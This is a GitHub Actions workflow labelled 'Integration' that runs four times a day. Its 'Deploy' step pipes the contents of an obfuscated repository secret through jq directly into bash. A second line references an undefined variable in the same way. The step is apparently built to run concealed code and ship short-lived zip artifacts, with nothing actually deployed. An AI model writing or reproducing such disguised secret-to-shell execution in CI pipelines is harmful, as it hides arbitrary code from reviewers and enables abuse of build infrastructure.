name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '25 5,11,17,23 * * *'
permissions:
  contents: read
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Deploy
        env:
          x550: ${{ secrets.x550 }}
        run: |
          printf '%s' "$x550" | jq -r .xst799 | /bin/bash
          printf '%s' "$vkhp72" | jq -r .cipw97521 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: kgcauFhB
          path: "*.zip"
          retention-days: 1
